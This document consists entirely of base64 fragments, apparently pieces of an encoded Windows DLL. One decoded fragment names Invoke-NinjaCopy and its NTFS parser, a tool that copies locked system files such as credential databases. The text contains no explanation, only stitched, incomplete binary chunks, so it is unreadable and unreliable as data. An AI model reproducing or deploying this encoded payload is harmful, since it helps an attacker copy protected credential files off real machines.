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','BOQoKRIlhUESIYUxIA89IiUwkKEiLBU','fQV5BXUFcX15dw8zMzMxIiUwkCFNIg+wwSMdEJCD+////SIvZSI0FSzUBAEiJAUiNBbk1AQBIiUFwSIO5gAAAAAB0Q0iLg4AAAABIiwhIiYuQAAAASItICEiFyXQKSIsBugEAAAD/EEiLi4AAAADoiw8AAEiLg5AAAABIiYOAAAAASIXAdb0zwEiJg4gAAABIiYOAAAAASImDkAAAAIlDeEiLy0iDxDBb6aHJ///MQFVWV0FUQVVBVkFXSIPsYEjHRCQw/v///0iJnCSoAAAASIsFOHIBAEgzxEiJRCRYTYvoTIvxSIlMJCBIjQXuNgEASIkBSIlRCEyJQShJi0AID7dICGZBiU4QSYtACItIDEGJThRJi0AIi0gUQYlOGEmLQAhIi0ggSYlOIEiNBYU2AQBJiQZJiVYwD7dCFEgDwkmJRjiLQhBBiUZASI0F/TMBAEmJBkiNBZM0AQBJiUZIRTPkTYlmYE2JZlhNiWZoRYlmUEmDeBj/D4TzAQAARYv8SL////////8AAA8fQABBi15ARDv7D4PVAQAAQY1HIDvDdgVBK9/rBbsgAAAARIvDQYvXSQNWOEiNTCQ46L0HAACD+yAPhaYBAACLdCQ4we4E/86D/hAPh5QBAABIi1wkSEgj30k7XRgPhHUBAACLzr8BAAAA0+dBhb2gAAAAD4RVAQAAuSgDAADoVA4AAEiJRCQoSIXAdBFJi1UISIvI6Irb//9Ii+jrA0mL7LkQAAAA6CwOAABIhcB0IUiJaAhMiSBJi05gSIXJdQZJiUZY6wNIiQFJiUZgQf9GUIm9oAAAAEiL00iLzeiB5P//hcAPhPsAAABIi83oUef//4P+EHMfSI0MtkiLnM24AAAASImczcgAAABIhdt0BkiLWwjrA0mL3EiF2w+EiAAAAEiNDLZIjT','cmVhY2hhYmxlAAAAAAAAAABpZGVudGlmaWVyIHJlbW92ZWQAAAAAAABpbGxlZ2FsIGJ5dGUgc2VxdWVuY2UAAABpbmFwcHJvcHJpYXRlIGlvIGNvbnRyb2wgb3BlcmF0aW9uAAAAAAAAaW52YWxpZCBzZWVrAAAAAGlzIGEgZGlyZWN0b3J5AABtZXNzYWdlIHNpemUAAAAAbmV0d29yayBkb3duAAAAAG5ldHdvcmsgcmVzZXQAAABuZXR3b3JrIHVucmVhY2hhYmxlAAAAAABubyBidWZmZXIgc3BhY2UAbm8gY2hpbGQgcHJvY2VzcwAAAAAAAAAAbm8gbGluawBubyBtZXNzYWdlIGF2YWlsYWJsZQAAAABubyBtZXNzYWdlAAAAAAAAbm8gcHJvdG9jb2wgb3B0aW9uAAAAAAAAbm8gc3RyZWFtIHJlc291cmNlcwAAAAAAbm8gc3VjaCBkZXZpY2Ugb3IgYWRkcmVzcwAAAAAAAABubyBzdWNoIHByb2Nlc3MAbm90IGEgZGlyZWN0b3J5AG5vdCBhIHNvY2tldAAAAABub3QgYSBzdHJlYW0AAAAAbm90IGNvbm5lY3RlZAAAAG5vdCBzdXBwb3J0ZWQAAABvcGVyYXRpb24gaW4gcHJvZ3Jlc3MAAABvcGVyYXRpb24gbm90IHBlcm1pdHRlZABvcGVyYXRpb24gbm90IHN1cHBvcnRlZABvcGVyYXRpb24gd291bGQgYmxvY2sAAABvd25lciBkZWFkAAAAAAAAcHJvdG9jb2wgZXJyb3IAAHByb3RvY29sIG5vdCBzdXBwb3J0ZWQAAHJlYWQgb25seSBmaWxlIHN5c3RlbQAAAHJlc291cmNlIGRlYWRsb2NrIHdvdWxkIG9jY3VyAAAAcmVzdWx0IG91dCBvZiByYW5nZQAAAAAAc3RhdGUgbm90IHJlY292ZXJhYmxlAAAAc3RyZWFtIHRpbWVvdXQAAHRleHQgZmlsZSBidXN5AAB0aW1lZCBvdXQAAAAAAAAAdG9vIG1hbnkgZmlsZXMgb3BlbiBpbiBzeXN0ZW0AAAB0b28gbWFueSBsaW5rcwAAdG9vIG1hbnkgc3ltYm9saWMgbGluayBsZXZlbHMAAAB2YWx1ZSB0b28gbGFyZ2UAd3JvbmcgcHJvdG9jb2wgdHlwZQAAAAAAOI4BgAEAAAAAEACAAQAAAKxdAIABAAAArF0AgAEAAAAwEACAAQAAAIAQAIABAAAAQBAAgAEAAADAjQGAAQAAAAAQAIABAAAAoBAAgAEAAACwEACAAQAAADAQAIABAAAAgBAAgAEAAABAEACAAQAAAGCOAYABAAAAABAAgAEAAAAgEQCAAQAAADARAIABAAAAMBAAgAEAAACAEACAAQAAAEAQAIABAAAA2I4BgAEAAAAAEACAAQAAAIARAIABAAAAkBEAgAEAAAAAEgCAAQAAAIAQAIABAAAAQBAAgAEAAAAYigGAAQAAAPBVAIABAAAA6HEAgAEAAABiYWQgYWxsb2NhdGlvbgAAmIoBgAEAAAAsVgCAAQAAAOhxAIABAAAAGIsBgAEAAAAsVgCAAQAAAOhxAIABAAAAoIsBgAEAAAAsVgCAAQAAAOhxAIABAAAAKIwBgAEAAAAIXgCAAQAAAPDYAYABAAAAkNkBgAEAAAAAAAAAAAAAAAAAAAAAAAAAY3Nt4AEAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAgBZMZAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACkAAIABAAAAAAAAAAAAAAAAAAAAAAAAAA8AAAAAAAAAIAWTGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','2tlLU5pbmphQ29weVxOVEZTUGFyc','ZmlsZW5hbWVfdG9vX2xvbmcAAAAAAAAAbmV0d29ya19kb3duAAAAAG5ldHdvcmtfcmVzZXQAAABuZXR3b3JrX3VucmVhY2hhYmxlAAAAAABub19idWZmZXJfc3BhY2UAbm9fcHJvdG9jb2xfb3B0aW9uAAAAAAAAbm90X2Nvbm5lY3RlZAAAAG5vdF9hX3NvY2tldAAAAABvcGVyYXRpb25fbm90X3N1cHBvcnRlZABwcm90b2NvbF9ub3Rfc3VwcG9ydGVkAAB3cm9uZ19wcm90b2NvbF90eXBlAAAAAAB0aW1lZF9vdXQAAAAAAAAAb3BlcmF0aW9uX3dvdWxkX2Jsb2NrAAAAYWRkcmVzcyBmYW1pbHkgbm90IHN1cHBvcnRlZAAAAABhZGRyZXNzIGluIHVzZQAAYWRkcmVzcyBub3QgYXZhaWxhYmxlAAAAYWxyZWFkeSBjb25uZWN0ZWQAAAAAAAAAYXJndW1lbnQgbGlzdCB0b28gbG9uZwAAYXJndW1lbnQgb3V0IG9mIGRvbWFpbgAAYmFkIGFkZHJlc3MAAAAAAGJhZCBmaWxlIGRlc2NyaXB0b3IAAAAAAGJhZCBtZXNzYWdlAAAAAABicm9rZW4gcGlwZQAAAAAAY29ubmVjdGlvbiBhYm9ydGVkAAAAAAAAY29ubmVjdGlvbiBhbHJlYWR5IGluIHByb2dyZXNzAABjb25uZWN0aW9uIHJlZnVzZWQAAAAAAABjb25uZWN0aW9uIHJlc2V0AAAAAAAAAABkZXN0aW5hdGlvbiBhZGRyZXNzIHJlcXVpcmVkAAAAAGV4ZWN1dGFibGUgZm9ybWF0IGVycm9yAGZpbGUgdG9vIGxhcmdlAABob3N0IHVu','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoIwBgAEAAAAocQCAAQAAAOhxAIABAAAAVW5rbm93biBleGNlcHRpb24AAAAAAAAAbQBzAGMAbwByAGUAZQAuAGQAbABsAAAAQ29yRXhpdFByb2Nlc3MAAAIAAAAAAAAAECoBgAEAAAAIAAAAAAAAAHAqAYABAAAACQAAAAAAAADQKgGAAQAAAAoAAAAAAAAAMCsBgAEAAAAQAAAAAAAAAIArAYABAAAAEQAAAAAAAADgKwGAAQAAABIAAAAAAAAAQCwBgAEAAAATAAAAAAAAAJAsAYABAAAAGAAAAAAAAADwLAGAAQAAABkAAAAAAAAAYC0BgAEAAAAaAAAAAAAAALAtAYABAAAAGwAAAAAAAAAgLgGAAQAAABwAAAAAAAAAkC4BgAEAAAAeAAAAAAAAAOAuAYABAAAAHwAAAAAAAAAgLwGAAQAAACAAAAAAAAAA8C8BgAEAAAAhAAAAAAAAAGAwAYABAAAAIgAAAAAAAABQMgGAAQAAAHgAAAAAAAAAuDIBgAEAAAB5AAAAAAAAANgyAYABAAAAegAAAAAAAAD4MgGAAQAAAPwAAAAAAAAAFDMBgAEAAAD/AAAAAAAAACAzAYABAAAAUgA2ADAAMAAyAA0ACgAtACAAZgBsAG8AYQB0AGkAbgBnACAAcABvAGkAbgB0ACAAcwB1AHAAcABvAHIAdAAgAG4AbwB0ACAAbABvAGEAZABlAGQADQAKAAAAAAAAAAAAUgA2ADAAMAA4AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAYQByAGcAdQBtAGUAbgB0AHMADQAKAAAAAAAAAAAAAAAAAAAAUgA2ADAAMAA5AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAZQBuAHYAaQByAG8AbgBtAGUAbgB0AA0ACgAAAAAAAAA